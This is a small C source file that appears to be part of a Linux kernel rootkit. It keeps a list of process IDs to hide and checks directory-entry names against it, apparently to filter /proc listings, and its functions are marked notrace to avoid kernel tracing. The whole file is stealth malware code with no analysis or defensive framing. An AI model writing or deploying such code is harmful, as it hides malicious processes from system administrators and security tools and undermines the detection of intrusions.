#include "../include/core.h"
#include "../include/hidden_pids.h"

int hidden_pids[MAX_HIDDEN_PIDS];
int hidden_count = 0;

notrace void add_hidden_pid(int pid) {
    int i;
    
    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid)
            return;
    }
    
    if (hidden_count < MAX_HIDDEN_PIDS) {
        hidden_pids[hidden_count++] = pid;
    }
}

notrace int is_hidden_pid(const char *d_name) {
    int pid, i;
    
    if (!d_name)
        return 0;
        
    if (kstrtoint(d_name, 10, &pid) < 0)
        return 0;

    for (i = 0; i < hidden_count; i++) {
        if (hidden_pids[i] == pid)
            return 1;
    }
    
    return 0;
}